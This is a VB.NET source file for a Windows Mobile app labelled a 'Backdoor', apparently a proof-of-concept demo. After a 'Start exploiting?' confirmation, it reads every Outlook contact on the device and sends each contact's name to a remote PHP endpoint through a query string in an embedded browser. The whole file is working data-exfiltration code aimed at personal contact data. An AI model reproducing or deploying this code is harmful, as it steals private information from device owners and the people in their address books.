Imports System.IO, System.Text, Microsoft.WindowsMobile.PocketOutlook

Public Class Form1
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMail.Click
        Dim session As Microsoft.WindowsMobile.PocketOutlook.OutlookSession = New OutlookSession()
        Dim i As Integer
        Dim sContact As String

        ChangeProgress(10)

        If (MsgBox("Start exploiting?", MsgBoxStyle.OkCancel + MsgBoxStyle.Information, "Exploiting") = MsgBoxResult.Ok) Then
            ChangeProgress(15)
            AddStatus("Sending data to server ...")
            For i = 0 To session.Contacts.Items.Count - 1
                sContact = session.Contacts.Items.Item(i).LastName & ", " & session.Contacts.Items.Item(i).FirstName
                webBrowser.Navigate(New System.Uri("http://www.scip.ch/getdata.php?" & sContact))
                AddStatus("   " & (i + 1) & ". " & sContact)
                While (webBrowser.ReadyState <> WebBrowserReadyState.Complete)
                    Application.DoEvents()
                End While
                ChangeProgress(psbStatus.Value + 5)
            Next
            AddStatus("Data has been sent.")
            ChangeProgress(90)
            AddStatus("Exploiting finished. Done.")
            ChangeProgress(100)
        Else
            ChangeProgress(10)
            AddStatus("Exploiting aborted.")
            ChangeProgress(100)
        End If
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ChangeProgress(10)
        AddStatus("Backdoor initiated. Ready.")
        ChangeProgress(100)
    End Sub

    Public Sub AddStatus(ByRef sStatus As String)
        lsbStatus.Items.Add(TimeString & " " & sStatus)
        lsbStatus.SelectedIndex = lsbStatus.Items.Count - 1
    End Sub

    Public Sub ChangeProgress(ByRef sProgress As String)
        If (sProgress < 0) Then
            sProgress = 0
        ElseIf (sProgress > 100) Then
            sProgress = 100
        End If

        psbStatus.Value = sProgress
    End Sub

    Private Sub btnDebug_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDebug.Click
        If (webBrowser.Visible = False) Then
            webBrowser.Visible = True
            lsbStatus.Visible = False
            btnDebug.Text = "Log"
        Else
            lsbStatus.Visible = True
            webBrowser.Visible = False
            btnDebug.Text = "Response"
        End If
    End Sub
End Class
